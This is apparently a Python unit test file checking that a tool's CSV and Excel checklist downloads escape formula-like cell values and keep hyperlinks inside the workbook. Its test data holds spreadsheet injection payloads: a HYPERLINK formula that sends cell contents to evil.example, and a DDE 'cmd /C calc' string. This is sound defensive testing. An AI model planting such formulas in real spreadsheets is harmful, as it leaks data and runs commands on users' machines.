"""
description: Unit tests for render_downloads: CSV and Excel checklist cells stay text, and cell links stay inside the model. Filesystem-free.
last_updated: 2026-11-24

Run: PYTHONPATH=scripts python -m unittest discover -s scripts/tests/unit -p "test_*.py"
"""

import csv
import io
import re
import sys
import unittest
import urllib.parse
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
sys.path.insert(0, str(Path(__file__).resolve().parent))

import render_downloads as RD  # noqa: E402
import xlsx_capture  # noqa: E402


def setUpModule() -> None:
    xlsx_capture.start()


def tearDownModule() -> None:
    xlsx_capture.stop()


EVIL = '=HYPERLINK("http://evil.example/?"&A1,"open")'


def row(**over):
    base = {
        "id": "F-001",
        "severity": "Warning",
        "basis": "Verified",
        "area": "Formula integrity",
        "group": "Errors",
        "sheet": "Calc",
        "cell": "D4",
        "label": "Total",
        "what": "Typed number",
        "question": "",
        "fix": "Use a formula",
        "change": "",
        "change_status": "Needs a person",
        "status": "Open",
    }
    base.update(over)
    return base


def csv_rows(link):
    data = urllib.parse.unquote(
        re.search(r'href="data:text/csv;charset=utf-8,([^"]+)"', link).group(1)
    )
    return list(csv.reader(io.StringIO(data.lstrip("\ufeff"))))


def workbook(link):
    """The Excel download the page just rendered (read from the recorded bytes)."""
    return xlsx_capture.last_workbook()


class TestCsvLink(unittest.TestCase):
    def test_fields_that_excel_would_evaluate_are_prefixed(self) -> None:
        link = RD.csv_link(
            [
                row(
                    sheet="=1+2",
                    label="@SUM(1+1)*cmd|' /C calc'!A0",
                    what="-2+3",
                    question="+x",
                    fix="\t=1",
                )
            ],
            "m.xlsx",
        )

        fields = csv_rows(link)[1]

        self.assertEqual(fields[5], "'=1+2")
        self.assertEqual(fields[7], "'@SUM(1+1)*cmd|' /C calc'!A0")
        self.assertTrue(all(f[:1] not in "=+-@\t\r" for f in fields if f))


class TestXlsxLink(unittest.TestCase):
    def test_no_cell_in_the_checklist_is_a_live_formula(self) -> None:
        link = RD.xlsx_link(
            [row(sheet="=1+2", label=EVIL, what=EVIL, question=EVIL, fix=EVIL)],
            "=1+2.xlsx",
            "now",
            EVIL,
        )

        wb = workbook(link)
        formulas = [
            c.coordinate
            for ws in wb
            for r in ws.iter_rows()
            for c in r
            if c.data_type == "f"
        ]

        self.assertEqual(formulas, [])
        self.assertEqual(wb["Issues"]["E2"].value, "=1+2")

    def test_cell_link_quotes_apostrophes_in_tab_names(self) -> None:
        wb = workbook(RD.xlsx_link([row(sheet="Bob's tab")], "model.xlsx", "now"))

        self.assertEqual(wb["Issues"]["F2"].hyperlink.location, "'Bob''s tab'!D4")

    def test_no_cell_link_when_the_name_is_not_a_plain_file_name(self) -> None:
        wb = workbook(RD.xlsx_link([row()], "http:evil.example", "now"))

        self.assertIsNone(wb["Issues"]["F2"].hyperlink)

    def test_signoff_rules_out_attestation(self) -> None:
        wb = workbook(RD.xlsx_link([row()], "model.xlsx", "now"))
        text = {r[0]: r[1] for r in wb["Sign-off"].iter_rows(values_only=True) if r[0]}[
            "Important"
        ]

        self.assertIn("in the scanned range", text)
        self.assertIn("not a financial statement audit", text)


if __name__ == "__main__":
    unittest.main()
